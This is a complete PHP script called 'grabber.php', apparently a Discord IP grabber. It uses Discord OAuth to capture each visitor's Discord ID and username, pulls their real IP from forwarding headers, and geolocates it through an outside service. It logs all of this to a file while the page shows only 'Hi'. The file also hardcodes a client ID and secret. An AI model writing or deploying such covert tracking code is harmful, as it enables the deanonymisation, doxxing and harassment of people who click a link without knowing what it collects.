
<?php
ob_start();
error_reporting(0);

$client_id     = "834943501225426944";
$client_secret = "GyVDl1yEtLFw80lxV2YrbfPiroo9xG6j";
$redirect      = "grabber.php";

function get_ip_address()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']) && validate_ip($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') !== false) {
            $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            foreach ($iplist as $ip) {
                if (validate_ip($ip))
                    return $ip;
            }
        } else {
            if (validate_ip($_SERVER['HTTP_X_FORWARDED_FOR']))
                return $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED']) && validate_ip($_SERVER['HTTP_X_FORWARDED']))
        return $_SERVER['HTTP_X_FORWARDED'];
    if (!empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && validate_ip($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
        return $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_FORWARDED_FOR']) && validate_ip($_SERVER['HTTP_FORWARDED_FOR']))
        return $_SERVER['HTTP_FORWARDED_FOR'];
    if (!empty($_SERVER['HTTP_FORWARDED']) && validate_ip($_SERVER['HTTP_FORWARDED']))
        return $_SERVER['HTTP_FORWARDED'];
    return $_SERVER['REMOTE_ADDR'];
}
function validate_ip($ip)
{
    if (strtolower($ip) === 'unknown')
        return false;
    $ip = ip2long($ip);
    if ($ip !== false && $ip !== -1) {
        $ip = sprintf('%u', $ip);
        if ($ip >= 0 && $ip <= 50331647)
            return false;
        if ($ip >= 167772160 && $ip <= 184549375)
            return false;
        if ($ip >= 2130706432 && $ip <= 2147483647)
            return false;
        if ($ip >= 2851995648 && $ip <= 2852061183)
            return false;
        if ($ip >= 2886729728 && $ip <= 2887778303)
            return false;
        if ($ip >= 3221225984 && $ip <= 3221226239)
            return false;
        if ($ip >= 3232235520 && $ip <= 3232301055)
            return false;
        if ($ip >= 4294967040)
            return false;
    }
    return true;
}
if (empty($_GET['code'])) {
    $params = array(
        'client_id' => $client_id,
        'redirect_uri' => $redirect,
        'response_type' => 'code',
        'scope' => 'identify guilds',
        'state' => $code
    );
    header('Location: https://discordapp.com/api/oauth2/authorize' . '?' . http_build_query($params));
}
if (isset($_GET['code'])) {
    $token_request = "https://discordapp.com/api/oauth2/token";
    $token         = curl_init();
    curl_setopt_array($token, array(
        CURLOPT_URL => $token_request,
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => array(
            "grant_type" => "authorization_code",
            "client_id" => $client_id,
            "client_secret" => $client_secret,
            "redirect_uri" => $redirect,
            "state" => $_GET['state'],
            "code" => $_GET["code"]
        )
    ));
    curl_setopt($token, CURLOPT_RETURNTRANSFER, true);
    $data         = json_decode(curl_exec($token));
    $access_token = $data->access_token;
}

$info_request = "https://discordapp.com/api/users/@me";
$info         = curl_init();
curl_setopt_array($info, array(
    CURLOPT_URL => $info_request,
    CURLOPT_HTTPHEADER => array(
        "Authorization: Bearer $access_token"
    ),
    CURLOPT_RETURNTRANSFER => true
));
$user    = json_decode(curl_exec($info));
$id      = $user->id;
$un      = $user->username;
$di      = $user->discriminator;
$diname  = $un . "#" . $di;
$ip      = get_ip_address();
if(isset($id)) {
    $json    = file_get_contents("http://extreme-ip-lookup.com/json/" . $ip);
    $data    = json_decode($json, true);
    $country = $data['country'];
    $date    = date('d/m/Y');
    $file  = fopen("logs.txt", "a+");
    fwrite($file, "Logged IP: ");
    fwrite($file, get_ip_address());
    fwrite($file, " ($diname) - ($id) - ($country), at $date");
    fwrite($file, "\n");
    fclose($file);
}
?>
<title>Hi</title>
